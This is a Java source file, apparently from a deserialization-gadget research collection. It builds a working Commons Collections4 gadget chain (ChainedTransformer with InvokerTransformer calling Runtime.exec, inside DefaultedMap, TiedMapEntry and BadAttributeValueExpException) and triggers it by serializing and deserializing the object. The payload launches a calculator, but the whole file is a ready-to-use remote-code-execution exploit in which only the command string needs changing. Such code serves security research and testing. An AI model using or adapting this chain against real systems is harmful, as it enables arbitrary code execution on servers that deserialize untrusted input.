package com.trganda.gadget.badattributevalueexpexception;

import com.trganda.gadget.utils.Reflections;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

import javax.management.BadAttributeValueExpException;

public class BadAttributeValueExpExceptionDefaultedMapExec {
    public static Object getObject() throws Exception {
        ConstantTransformer fakeTransformer = new ConstantTransformer("1");
        ChainedTransformer chainedTransformer =
                new ChainedTransformer(
                        new Transformer[] {
                            new ConstantTransformer(Runtime.class),
                            new InvokerTransformer(
                                    "getMethod",
                                    new Class[] {String.class, Class[].class},
                                    new Object[] {"getRuntime", new Class[0]}),
                            new InvokerTransformer(
                                    "invoke",
                                    new Class[] {Object.class, Object[].class},
                                    new Object[] {null, new Object[0]}),
                            new InvokerTransformer(
                                    "exec",
                                    new Class[] {String.class},
                                    new Object[] {"open -a calculator"})
                        });

        DefaultedMap defaultedMap = new DefaultedMap(fakeTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, "fake");

        // 参数设置为 null，避免序列化时触发 toString 方法
        BadAttributeValueExpException badAttributeValueExpException =
                new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", tiedMapEntry);
        // 修改 key 的值，从而触发 LazyMap#get 中 factory.transform 方法的执行
        Reflections.setFieldValue(tiedMapEntry, "key", "k");

        Reflections.setFieldValue(defaultedMap, "value", chainedTransformer);

        return badAttributeValueExpException;
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream oos =
                new ObjectOutputStream(
                        Files.newOutputStream(
                                Paths.get(
                                        "target/BadAttributeValueExpExceptionDefaultedMapExec.bin")));
        oos.writeObject(getObject());

        ObjectInputStream ois =
                new ObjectInputStream(
                        Files.newInputStream(
                                Paths.get(
                                        "target/BadAttributeValueExpExceptionDefaultedMapExec.bin")));
        ois.readObject();
    }
}
